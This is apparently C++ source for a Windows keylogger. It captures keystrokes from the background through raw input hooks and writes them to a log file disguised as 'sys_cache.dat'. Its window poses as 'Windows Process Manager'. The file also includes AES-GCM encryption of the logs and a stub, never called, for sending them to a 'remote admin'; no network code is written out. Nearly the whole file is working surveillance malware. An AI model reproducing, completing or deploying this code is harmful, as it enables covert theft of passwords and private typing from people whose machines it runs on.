#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601 // Windows 7 or later
#endif
#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <sstream>
#include <wincrypt.h>
#include <winuser.h>
#include <ctime>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>

const int AES_KEY_SIZE = 32;
const int AES_IV_SIZE = 12;
const int AES_TAG_SIZE = 16;

// Logging functions

void logEvent(const std::string &event)
{
    std::ofstream logFile("sys_cache.dat", std::ios::app);
    if (logFile.is_open())
    {
        logFile << event << "\n";
        logFile.close();
    }
}

void logTimestamp()
{
    std::ofstream logFile("sys_cache.dat", std::ios::app);
    if (logFile.is_open())
    {
        time_t now = time(0);
        tm *localTime = localtime(&now);
        logFile << "Log started at [" << (localTime->tm_hour < 10 ? "0" : "") << localTime->tm_hour << ":"
                << (localTime->tm_min < 10 ? "0" : "") << localTime->tm_min << ":"
                << (localTime->tm_sec < 10 ? "0" : "") << localTime->tm_sec << "]\n";
        logFile << "-------------------------\n";
        logFile.close();
    }
}

void processRawInput(LPARAM lParam)
{
    UINT dwSize;
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
    std::vector<BYTE> lpb(dwSize);
    if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb.data(), &dwSize, sizeof(RAWINPUTHEADER)) == dwSize)
    {
        RAWINPUT *raw = (RAWINPUT *)lpb.data();
        if (raw->header.dwType == RIM_TYPEKEYBOARD)
        {
            USHORT vKey = raw->data.keyboard.VKey;
            bool keyUp = raw->data.keyboard.Flags & RI_KEY_BREAK;

            if (vKey == VK_CAPITAL && !keyUp)
                logEvent("CAPSLOCKON");
            if (vKey == VK_CAPITAL && keyUp)
                logEvent("CAPSLOCKOFF");
            if (vKey == VK_SHIFT && !keyUp)
                logEvent("SHIFTPRESSED");
            if (vKey == VK_SHIFT && keyUp)
                logEvent("SHIFTRELEASED");
            if (vKey == VK_RETURN && !keyUp)
                logEvent("ENTER");
            if (vKey == VK_BACK && !keyUp)
                logEvent("BACKSPACE");
            if (vKey == VK_LEFT && !keyUp)
                logEvent("LEFTARROW");
            if (vKey == VK_RIGHT && !keyUp)
                logEvent("RIGHTARROW");
            if (vKey == VK_UP && !keyUp)
                logEvent("UPARROW");
            if (vKey == VK_DOWN && !keyUp)
                logEvent("DOWNARROW");

            if (!keyUp && vKey != VK_CAPITAL && vKey != VK_SHIFT && vKey != VK_RETURN && vKey != VK_BACK &&
                vKey != VK_LEFT && vKey != VK_RIGHT && vKey != VK_UP && vKey != VK_DOWN)
            {
                char character = MapVirtualKey(vKey, MAPVK_VK_TO_CHAR);
                if (character && isprint(character))
                { // Only log printable characters
                    logEvent(std::string(1, character));
                }
            }
        }
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_INPUT)
    {
        processRawInput(lParam);
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void registerRawInput(HWND hwnd)
{
    RAWINPUTDEVICE rid;
    rid.usUsagePage = 0x01;
    rid.usUsage = 0x06;
    rid.dwFlags = RIDEV_INPUTSINK;
    rid.hwndTarget = hwnd;

    if (!RegisterRawInputDevices(&rid, 1, sizeof(rid)))
    {
        std::cerr << "Failed to register raw input device.\n";
    }
    else
    {
        std::cout << "Raw input registered successfully.\n";
    }
}
// AES encryption and send functions

// Encrypt a file using AES-256-GCM
bool encryptFile(const std::string &inputFile, const std::string &outputFile, const std::vector<unsigned char> &key)
{
    std::ifstream inFile(inputFile, std::ios::binary);
    std::ofstream outFile(outputFile, std::ios::binary);

    if (!inFile || !outFile)
        return false;

    unsigned char iv[AES_IV_SIZE];
    RAND_bytes(iv, AES_IV_SIZE);
    outFile.write(reinterpret_cast<char *>(iv), AES_IV_SIZE);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key.data(), iv);

    char buffer[4096];
    int bytesRead;
    unsigned char outBuffer[4096 + AES_TAG_SIZE];
    int outLen;
    while ((bytesRead = inFile.readsome(buffer, sizeof(buffer))) > 0)
    {
        EVP_EncryptUpdate(ctx, outBuffer, &outLen, reinterpret_cast<unsigned char *>(buffer), bytesRead);
        outFile.write(reinterpret_cast<char *>(outBuffer), outLen);
    }

    EVP_EncryptFinal_ex(ctx, outBuffer, &outLen);
    outFile.write(reinterpret_cast<char *>(outBuffer), outLen);

    unsigned char tag[AES_TAG_SIZE];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_SIZE, tag);
    outFile.write(reinterpret_cast<char *>(tag), AES_TAG_SIZE);

    EVP_CIPHER_CTX_free(ctx);
    return true;
}

// Send logs securely to the remote admin
void sendLogs(const std::string &file)
{
    std::vector<unsigned char> key(AES_KEY_SIZE, 0x01); // Placeholder key, replace with a secure one
    encryptFile(file, "logs_encrypted.bin", key);
    // Code to send "logs_encrypted.bin" to the remote admin
}

// Main Execution
int main()
{
    // Register the window class
    const char CLASS_NAME[] = "RawInputWindowClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc))
    {
        return -1;
    }

    // Create the window
    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        "Windows Process Manager",
        0,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        NULL);

    if (!hwnd)
    {
        return -1;
    }

    // Register raw input devices
    RAWINPUTDEVICE rid;
    rid.usUsagePage = 0x01; // Generic Desktop Controls
    rid.usUsage = 0x06;     // Keyboard
    rid.dwFlags = RIDEV_INPUTSINK;
    rid.hwndTarget = hwnd;

    if (!RegisterRawInputDevices(&rid, 1, sizeof(rid)))
    {
        return -1;
    }

    // Log the start timestamp
    logTimestamp();

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

